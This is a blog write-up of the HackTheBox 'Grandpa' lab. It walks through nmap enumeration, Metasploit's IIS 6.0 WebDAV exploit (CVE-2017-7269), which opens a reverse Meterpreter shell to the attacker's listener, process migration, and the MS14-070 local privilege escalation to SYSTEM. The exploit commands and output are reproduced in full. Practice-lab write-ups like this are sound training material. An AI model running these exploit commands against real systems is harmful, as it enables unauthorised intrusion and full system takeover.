---
title: HackTheBox - Grandpa
layout: post
categories: writeups
date: 2020-07-23 23:12 -0500
---
![Grandpa](/assets/images/HTBoxes/Grandpa/Grandpa.png)

## Summary

Grandpa is a very easy Windows box that deals with learning about a couple vulnerabilities.  The enumeration is very straightforward and the foothold is established by exploiting [CVE-2017-7269](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7269).  After gaining a foothold the path to administrator can also be done via another vulnerability.  First I had to migrate to a process that allowed for the exploitation to occur but then [CVE-2014-4076](https://www.exploit-db.com/exploits/35936) succeeded to gain an administrative shell.

## Walkthrough

### Enumeration

```console
nmap -A -T4 -v 10.10.10.14

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT POST MOVE MKCOL PROPPATCH
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan:
|   Server Date: Fri, 24 Jul 2020 02:38:43 GMT
|   WebDAV type: Unknown
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Server Type: Microsoft-IIS/6.0
|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Let's checkout the website.  A simple under construction page it looks like:

![Grandpa website](/assets/images/HTBoxes/Grandpa/grandpa-website.png)

### Foothold

I noticed with the nmap scan it is showing IIS 6.0, so based off how old that is I'm guessing there's a CVE involved.  Basically googling "IIS 6.0 remote code execution" and I come across a WebDAV buffer overflow vulnerability ([CVE-2017-7269](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7269)).  There's a [metasploit exploit](https://github.com/rapid7/metasploit-framework/pull/8162) to use here.

```console
msf5 > use exploit/windows/iis/iis_webdav_scstoragepathfromurl
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > show options

Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   MAXPATHLENGTH  60               yes       End of physical path brute force
   MINPATHLENGTH  3                yes       Start of physical path brute force
   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          80               yes       The target port (TCP)
   SSL            false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI      /                yes       Path of IIS 6 web application
   VHOST                           no        HTTP server virtual host

Exploit target:

   Id  Name
   --  ----
   0   Microsoft Windows Server 2003 R2 SP2 x86

msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set RHOSTS 10.10.10.14
RHOSTS => 10.10.10.14
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > run

[*] Started reverse TCP handler on 10.10.14.2:4444
[*] Trying path length 3 to 60 ...
[*] Sending stage (176195 bytes) to 10.10.10.14
[*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.10.14:1030) at 2020-07-23 21:45:25 -0500

meterpreter >
```

getuid failed within meterpreter so I dropped to a shell and discovered I'm running as NETWORK SERVICE.  Poking around the file system I do see a user "Harry" in C:\Documents and Settings\

![docsandsettings](/assets/images/HTBoxes/Grandpa/docsandsettings.png)

### User

After some poking around, I wasn't sure how to pivot to 'Harry' so I dropped back to the meterpreter shell and checked the sysinfo.

```console
meterpreter > sysinfo
Computer        : GRANPA
OS              : Windows .NET Server (5.2 Build 3790, Service Pack 2)
Architecture    : x86
System Language : en_US
Domain          : HTB
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter >
```

I googled once again. "_Windows .NET Server (5.2 Build 3790, Service Pack 2) privesc_" returned a result containing [CVE-2014-4076](https://www.exploit-db.com/exploits/35936) (second result).  Time to check if metasploit has this already.

```console
msf5 post(multi/recon/local_exploit_suggester) > search ms14_070

Matching Modules
================

   #  Name                                        Disclosure Date  Rank     Check  Description
   -  ----                                        ---------------  ----     -----  -----------
   0  exploit/windows/local/ms14_070_tcpip_ioctl  2014-11-11       average  Yes    MS14-070 Windows tcpip!SetAddrOptions NULL Pointer Dereference


msf5 post(multi/recon/local_exploit_suggester) >
```

Jackpot.

I basically skipped pivoting to user and went straight to exploiting to admin via the above exploit in metasploit.  I got access to user.txt via the administrative shell in the next section.

### Root

Let's run the privesc exploit.

```console
msf5 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms14_070_tcpip_ioctl
msf5 exploit(windows/local/ms14_070_tcpip_ioctl) > show options

Module options (exploit/windows/local/ms14_070_tcpip_ioctl):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.


Exploit target:

   Id  Name
   --  ----
   0   Windows Server 2003 SP2


msf5 exploit(windows/local/ms14_070_tcpip_ioctl) > set SESSION 1
SESSION => 1
msf5 exploit(windows/local/ms14_070_tcpip_ioctl) > run

[*] Started reverse TCP handler on 10.0.2.15:4444
[-] Exploit failed: Rex::Post::Meterpreter::RequestError stdapi_sys_config_getsid: Operation failed: Access is denied.
[*] Exploit completed, but no session was created.
msf5 exploit(windows/local/ms14_070_tcpip_ioctl) >
```

Wut. I haven't migrated yet, so I tried migrating to a new process to see if I have better luck.  While looking to migrate I was disconnected.  So I re-executed my initial payload on the machine and now my SESSION is 2.  Let's migrate.

```console
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System
 272   4     smss.exe
 324   272   csrss.exe
 348   272   winlogon.exe
 396   348   services.exe
 408   348   lsass.exe
 600   396   svchost.exe
 684   396   svchost.exe
 740   396   svchost.exe
 768   396   svchost.exe
 804   396   svchost.exe
 940   396   spoolsv.exe
 968   396   msdtc.exe
 1080  396   cisvc.exe
 1124  396   svchost.exe
 1184  396   inetinfo.exe
 1220  396   svchost.exe
 1332  396   VGAuthService.exe
 1412  396   vmtoolsd.exe
 1460  396   svchost.exe
 1636  396   alg.exe
 1692  396   svchost.exe
 1776  600   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 1916  396   dllhost.exe
 2192  1460  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 2260  600   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
 2308  2192  rundll32.exe       x86   0                                      C:\WINDOWS\system32\rundll32.exe
 2492  600   wmiprvse.exe

meterpreter > migrate 2260
[*] Migrating from 2308 to 2260...
[*] Migration completed successfully.
meterpreter > background
[*] Backgrounding session 2...

msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > use exploit/windows/local/ms14_070_tcpip_ioctl
msf5 exploit(windows/local/ms14_070_tcpip_ioctl) > show options

Module options (exploit/windows/local/ms14_070_tcpip_ioctl):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows Server 2003 SP2


msf5 exploit(windows/local/ms14_070_tcpip_ioctl) > set LHOST 10.10.14.2
LHOST => 10.10.14.2
msf5 exploit(windows/local/ms14_070_tcpip_ioctl) > set SESSION 2
SESSION => 2
msf5 exploit(windows/local/ms14_070_tcpip_ioctl) > run

[*] Started reverse TCP handler on 10.10.14.2:4444
[*] Storing the shellcode in memory...
[*] Triggering the vulnerability...
[*] Checking privileges after exploitation...
[+] Exploitation successful!
[*] Sending stage (176195 bytes) to 10.10.10.14
[*] Meterpreter session 3 opened (10.10.14.2:4444 -> 10.10.10.14:1031) at 2020-07-23 22:42:37 -0500

meterpreter > background
[*] Backgrounding session 3...
msf5 exploit(windows/local/ms14_070_tcpip_ioctl) > sessions

Active sessions
===============

  Id  Name  Type                     Information                            Connection
  --  ----  ----                     -----------                            ----------
  2         meterpreter x86/windows  NT AUTHORITY\NETWORK SERVICE @ GRANPA  10.10.14.2:4444 -> 10.10.10.14:1030 (10.10.10.14)
  3         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ GRANPA           10.10.14.2:4444 -> 10.10.10.14:1031 (10.10.10.14)
```

And with that, I use the administrative session to pull the flags.

```console
msf5 exploit(windows/local/ms14_070_tcpip_ioctl) > sessions 3
[*] Starting interaction with 3...

meterpreter > cat "C:\Documents and Settings\Harry\Desktop\user.txt"
bdff ...
meterpreter > cat "C:\Documents and Settings\Administrator\Desktop\root.txt"
9359 ...
meterpreter >
```

### Lessons Learned

Overall this box was mainly about enumerating for me.  I had to do some Google Fu to find the correct CVEs to exploit.  Since it was super easy with metasploit it was a good repetition of using metasploit and the merits of migrating processes after gaining a foothold to try exploits when they fail the first time.  Overall a straightforward box.  Onto the next one!
